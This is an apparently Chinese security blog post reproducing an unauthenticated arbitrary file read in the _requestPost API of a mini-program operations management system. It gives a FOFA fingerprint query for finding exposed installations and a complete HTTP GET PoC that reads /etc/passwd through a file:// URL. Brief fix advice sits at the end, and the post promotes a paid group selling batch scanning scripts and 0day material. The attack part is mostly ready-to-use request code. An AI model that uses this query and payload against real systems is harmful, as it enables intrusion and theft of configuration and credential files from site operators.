#  「漏洞复现」万能小程序运营管理系统 _requestPost 任意文件读取漏洞   
冷漠安全  冷漠安全   2024-09-20 14:29  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
万能小程序运营管理系统是一种功能全面的系统，旨在帮助开发者和运营人员更好地管理和推广小程序。该系统集成了多种功能模块，覆盖了从小程序开发、部署到运营管理的全链条服务。系统通过提供丰富的功能和工具，帮助用户轻松搭建、管理和优化小程序。该系统支持多平台部署，包括微信小程序、支付宝小程序、百度小程序、QQ小程序等，满足不同用户的需求。  
  
0x03  
  
**漏洞威胁**  
  
万能小程序运营管理系统 _requestPost 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
body="/com/css/head_foot.css" || body="/com/css/iconfont"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oIYbFHJLacqYib2zmVJDCbxW75vJ8a1wuIicZolVEMMZkkz6JK6k0icBjcAbvXoPOibaHYKaIzBEWicmA/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
GET /api/wxapps/_requestPost?data=1&url=file:///etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oIYbFHJLacqYib2zmVJDCbxkVu0gFDjrhvr3DPnuNM1bnEC2P9qLh2rkg1uib7ibedBNWbtdCDxuw8A/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oIYbFHJLacqYib2zmVJDCbxEEP2ibt1BP6HoCTlU43jIibVsnetauOHDLUQbgMiaBCr6U4IicloeuHqaQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oIYbFHJLacqYib2zmVJDCbxChOhSIzCM9abtqt3QzG4eaGYT8JLO7GOibBgdruZMEHvsiaGFYzKXRzQ/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0oIYbFHJLacqYib2zmVJDCbxfC3FxutQIEPTIx9rG5iafAHxIMEicmDchgyWFc1LSuClQCo8EYHqYeUg/640?wx_fmt=gif&from=appmsg "")  
  
  
